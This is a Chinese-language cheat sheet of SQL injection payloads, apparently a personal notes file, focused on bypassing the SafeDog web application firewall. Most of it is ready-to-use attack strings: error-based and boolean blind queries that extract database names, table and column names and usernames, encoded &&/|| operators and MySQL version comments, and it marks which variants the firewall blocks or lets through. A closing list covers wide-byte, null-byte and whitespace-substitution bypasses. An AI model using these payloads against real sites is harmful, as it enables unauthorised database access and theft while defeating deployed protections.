# sql注入的语句

```txt
111' or length(SYS_CONTEXT('USERENV', 'CURRENT_USER')) = 5 or 'x' ='y
1%27 and(select 1 FROM(select count(*),concat((select (select concat(md5(1),0x27,0x7e)) FROM information_schema.tables LIMIT 0,1),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--


```

## 绕过安全狗

```txt

先判断是否存在注入
1' and 1=1--+      # 拦截
1' or 1=1--+       # 拦截
1' && 1--+         # 拦截
1' || 1--+         # 拦截
xor 1--+
使用url对&&和||编码可以绕过拦截
1' %26%26 True--+      # 不拦截
1' %26%26 false--+     # 不拦截
1' %7c%7c True--+      # 不拦截
1' %7c%7c false--+     # 不拦截

这三个来判断
xor 1--+
1' %26%26 True--+
1' %26%26 false--+


判断数据库的长度：'%26%26 (length(/*!database*/())=1)--+
判断数据库的名称：'%26%26 (ascii(substr((/*!database*/()),1,1))>64)--+
获取用户长度：'%26%26 (length(/*!USER*/())=14)--+  # 绕过
获取版本信息：' %26%26 (ascii(@@version)=53)--+

获取数据库的表数量:
' %26%26 (0<(select count(/*!table_name*/) from information_schema.tables where table_schema=DBname))--+

获取数据库的表名,这个语句拦截出在select xx from,一般出现select xx from都会被拦截，思路可以想上面的获取数量一样，使用一个函数将xx包起来，尝试一下:
' %26%26 (0< ascii((select substr(/*!table_name*/,1,1) from information_schema.tables where table_schema=DBname limit 0,1))) --+    # 不拦截
' %26%26 (0x65 = (select substr(/*!table_name*/,1,1) from information_schema.tables where table_schema=0x7365637572697479 limit 0,1)) --+    # 不拦截

获取数据库的字段
' %26%26 (0< ascii((select substr(/*!column_name*/,2,1) from information_schema.columns where table_schema = 0x7365637572697479 %26%26 table_name = 0x7573657273 LIMIT 1,1)))--+
' %26%26 (0<ascii(substr((select group_concat(/*!column_name*/) from information_schema.columns  where table_schema=0x7365637572697479 %26%26 table_name=0x7573657273),1,1))) --+

获取数据
' %26%26 (0<ascii(substr((SELECT group_concat(/*!username*/) FROM `security`.`users`),1,1))) --+

```

sql注入相同功能的函数

```txt
Sql注入截取字符串常用函数  -- mid,substr,left
SQL注入返回字符串的ascii码 -- ord和ascii

```

绕过思路：

1. 特殊字符使用加密，除了使用URL编码外，还可以使用其他的编码方式进行绕过尝试，例如Unicode编码，Base64编码，Hex编码，ASCII编码等，原理与URL编码类似。
2. 在使用数据库的值时，可以直接用16进制：information_schema.columns  where table_schema=0x7365637572697479 %26%26 table_name=0x7573657273
3. 在mysql中 /*! ....*/ 不是注释，mysql为了保持兼容，它把一些特有的仅在mysql上用的语句放在/*!....*/中，这样这些语句如果在其他数据库中是不会被执行，但在mysql中它会执行
4. 字母大小写转换绕过
5. 双关键字绕过
6. 请求方式差异规则松懈性绕过
7. 异常Method绕过
8. 超大数据包绕过
9. 宽字节绕过：?id=1%df%27and 1=1--+
10. %00截断
11. 空格过滤绕过

```txt
a)   使用空白符替换空格绕过
b)  使用‘+’替换空格绕过
c)   使用注释符/**/替换空格绕过
数据库类型      允许的空白符
SQLite3         0A，0D，0C，09，20
MySQL5          09，0A，0B，0C，0D，A0，20
PosgresSQL      0A，0D，0C，09，20
Oracle 11g      00，0A，0D，0C，09，20
MSSQL           01，02，03，04，05，06，07，08，09，0A，0B，0C，0D，0E，0F，10，11，12，13，14，15，16，17，18，19，1A，1B，1C，1D，1E，1F，20
```